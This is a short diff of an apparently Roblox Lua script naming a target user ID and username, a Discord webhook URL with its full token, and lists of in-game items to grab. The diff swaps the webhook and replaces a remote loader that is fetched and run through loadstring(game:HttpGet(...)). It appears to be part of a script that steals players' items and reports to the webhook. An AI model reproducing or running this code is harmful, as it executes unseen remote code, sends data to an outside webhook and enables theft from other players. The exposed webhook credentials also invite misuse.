@@ -1,6 +1,6 @@
 local TARGET_ID = 7429751111
 local TARGET_USER = "4y0ub12"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1573392454793564312/58fLV5iyROj7xP4vH3YriGwsTnee2uSLxHRwL1yqZYq3u9PHaREUR43c3eZNDEsDNxs0"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1573715439568293938/36OAD45hqfAuP3RGq1H88Z62zZmRbkp1CMwpCA2nM8wr2Fh340hqKmynE3RUMNoZu3KW"
 
 local TargetBrainrots = {
     ["Hydra Bunny"] = true,
@@ -355,7 +355,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=7phxhpsa"))()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/f348726840d71dcc41335a99463dbad8.lua"))()
 
     task.wait(1)
 
